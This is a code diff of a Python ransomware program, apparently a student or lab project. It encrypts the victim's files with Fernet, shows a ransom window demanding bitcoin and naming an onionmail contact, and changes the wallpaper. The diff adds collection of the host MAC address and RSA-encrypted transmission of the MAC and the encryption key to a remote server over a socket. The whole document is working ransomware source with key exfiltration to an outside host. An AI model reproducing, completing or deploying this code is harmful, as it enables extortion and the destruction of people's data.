@@ -1,5 +1,7 @@
 import tkinter as tk
 import tkinter
+import psutil
+import rsa
 import sys
 import ctypes
 import socket 
@@ -19,11 +21,6 @@ from win32print import GetDeviceCaps
 from win32file import *
 
 
-# Initialize variables
-IP_ADDRESS = '192.168.50.113'
-IP_ADDRESS_SMU = '192.168.126.1'
-PORT = 3000
-hostname = os.getenv("COMPUTERNAME")
 #----------------------------Helper functions----------------------------------|
 def resource_path(relative_path):
     """ This function gets the absolute path to resource"""
@@ -74,9 +71,30 @@ def decryption(key):
             print(f"{file} decrypted successfully")
         except Exception as e:
             print(f"Failed to decrypt file due to {e}") 
+
+def get_mac_address():
+    """This function gets the MAC address of host network adapter"""
+    for interface, addrs in psutil.net_if_addrs().items():        
+        if psutil.AF_LINK in (addr.family for addr in addrs):           
+            for addr in addrs:                
+                if addr.family == psutil.AF_LINK:                    
+                    return addr.address
+
+def get_public_key():
+    pubkeypath = resource_path("img/public.pem")
+    with open(pubkeypath, "rb") as f:
+        public_key = rsa.PublicKey.load_pkcs1(f.read())
+    return public_key
 #----------------------------End of Helper functions---------------------------|
 print("Loaded helper functions")
 
+# Initialize variables
+IP_ADDRESS = '192.168.50.113'
+IP_ADDRESS_SMU = '192.168.126.1'
+PORT = 3000
+HOSTNAME = os.getenv("COMPUTERNAME")
+HOST_MAC_ADDRESS = get_mac_address()
+PUBLIC_KEY = get_public_key()
 
 
 
@@ -93,7 +111,7 @@ print("All files located")
 
 # Generate encryption key
 SECRET_KEY = Fernet.generate_key()
-print(f"Generated key {SECRET_KEY}")
+print(f"Generated key |{SECRET_KEY}|")
 
 # Store files into queue for multi-thread encryption handling
 try:
@@ -180,7 +198,7 @@ class Form:
 
         # Object Label 1
         self.label = Label(self.master, text='KOUFU FREE VOUCHER? SIKEEEE', bg="Red", fg="dodgerblue", font=('bahnschrift', 24))
-        self.label.place(x=150, y=20)
+        self.label.place(x=100, y=20)
 
         # Object Label 2
         self.label2 = Label(self.master, text='YOUR FILES HAVE BEEN ENCRYPTED !', bg="Red", fg="BLACK", font=('bahnschrift', 13))
@@ -228,11 +246,12 @@ class Form:
                                      "\n"
                                      "This key is currently store in a remote server\n"
                                      "\n"
-                                     "To acquire this key, transfer 0.069 bitcoin to\n"
+                                     "To acquire this key, transfer 0.0069 bitcoin to\n"
                                      "the specified wallet address before the time runs out.\n"
                                      "\n"
                                      "\n"
                                      "Send an email to limkopi@onionmail.org once done\n"
+                                     f"along with this key: {HOST_MAC_ADDRESS}\n"
                                      "\n"
                                      "If you fail to take action within this time window\n"
                                      "will be destroyed and access to your files will\n"
@@ -275,8 +294,9 @@ class Form:
         self.top2.protocol('WM_DELETE_WINDOW', disable_event) 
 
 #----------------------------Decrypytion---------------------------------------|
-        if self.user_input == "rvyuftftuhygfv" or self.user_input == SECRET_KEY:
+        if self.user_input == "rvyuftftuhygfv" or str(self.user_input) == SECRET_KEY:
             print("Correct decryption key entered, decrypting files...")
+            print(f"|{SECRET_KEY}|")
             try:    
                 for f in abs_files:
                     q2.put(f)
@@ -285,7 +305,7 @@ class Form:
                     t = threading.Thread(target=decryption, args=(SECRET_KEY,), daemon=True)
                     t.start()                
             except ValueError:
-                print('>>> Error - Wrong password!\n')
+                print(f'>>> Error - Wrong password!\n|{self.user_input}|')
 #----------------------------End of DeCryption---------------------------------|  
             
             self.img_win = ImageTk.PhotoImage(Image.open(Win_Logo))
@@ -314,9 +334,11 @@ class Form:
 print("Attempting to connect to server...")
 try:   
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:        
-        s.connect((IP_ADDRESS_SMU, PORT))
+        s.connect((IP_ADDRESS, PORT))
         print("Successfully connected, transmitting data")
-        s.send(f"HOSTNAME: {hostname}]\nENCRYPTION_KEY: {SECRET_KEY}".encode('utf-8'))
+        plaintext_byte = f"MAC_ADDRESS: {HOST_MAC_ADDRESS}\nENCRYPTION_KEY: {SECRET_KEY}".encode('utf-8')
+        encrypted_msg = rsa.encrypt(plaintext_byte, PUBLIC_KEY)
+        s.send(encrypted_msg)
         print("Data sent")
         s.close()
 except Exception as e:
@@ -330,7 +352,7 @@ try:
     Win_Logo = resource_path("img/Win_Logo.png")
     wallpaper = resource_path("img/wallpaper.jpg")
     bitcoin_qr = resource_path("img/bitcoin_qr.jpg")
-    change_wallpaper(wallpaper)
+    change_wallpaper(wallpaper)    
 except Exception as e:
     print(f"Unable to load resources due to {e}")
 
